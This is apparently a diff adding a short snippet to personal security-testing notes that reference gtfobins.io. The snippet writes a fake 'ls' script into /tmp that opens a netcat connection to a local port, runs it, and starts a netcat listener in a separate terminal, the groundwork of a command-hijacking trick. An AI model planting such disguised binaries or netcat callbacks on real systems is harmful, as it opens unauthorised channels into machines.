@@ -178,6 +178,14 @@ gtfobins.io
 
 
 
+vim /tmp/ls
+	#!/bin/bash
+	nc 127.0.0.1 3333
+chmod +x ls
+/tmp/ls
+
+SEPERATE TERMINAL
+	nc -lvp 3333
 
 
 
